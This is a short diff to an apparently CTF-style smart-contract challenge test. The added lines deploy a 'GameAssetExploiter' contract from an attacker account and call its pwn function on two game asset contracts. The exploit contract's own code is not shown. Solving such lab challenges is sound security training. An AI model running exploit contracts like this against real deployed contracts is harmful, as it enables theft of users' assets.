@@ -52,6 +52,13 @@ it("solves the challenge", async function () {
 
   // implement solution here
 
+  let pwnFactory = await ethers.getContractFactory('GameAssetExploiter')
+  let pwner = await pwnFactory.connect(attacker).deploy(assetWrapper.address)
+  await pwner.connect(attacker).pwn(swordAsset.address, 1)
+  await pwner.connect(attacker).pwn(shieldAsset.address, 1)
+
+
+
 });
 
 /// expected final state
